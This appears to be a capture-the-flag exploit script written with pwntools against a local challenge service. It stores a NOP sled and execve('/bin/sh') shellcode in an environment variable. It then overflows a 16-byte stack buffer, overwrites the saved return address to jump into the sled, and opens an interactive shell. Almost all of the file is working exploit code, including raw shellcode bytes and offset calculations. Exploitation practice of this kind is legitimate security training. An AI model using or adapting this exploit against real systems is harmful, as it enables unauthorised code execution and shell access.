from pwn import *

context.arch = "amd64"

# observed range of offsets are smaller than before
# NOP sled with comfortable room for error
sled_len = 0x5000

# BEFORE PROCEEDING, STOP AND DO THIS AND THEN REEXECUTE THE CHALLENGE EXE
# place shellcode in environment to get around buffer limit

# export SHELLCODE_CMD=$(python3 -c "import sys; sys.stdout.buffer.write(b'\x90' * 0x5000 + b'\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05')")

host = "localhost"
port = 1337
# io = start(env={"SHELLCODE_CMD": payload})

buf_size = 0x10  # 16

main_rsp_addr = 0x7fff4333fc80  # given by program

target_env_addr_proximity = main_rsp_addr + sled_len

saved_rip_offset = 0x28

payload = (
    b"a" * (buf_size)  # padding, fill the buffer
    + b"b" * (saved_rip_offset - buf_size)  # padding, fill gap between buffer and saved rip
    + p64(target_env_addr_proximity)
)

print(payload)
target = remote(host, port)

target.sendline(payload)

target.interactive()
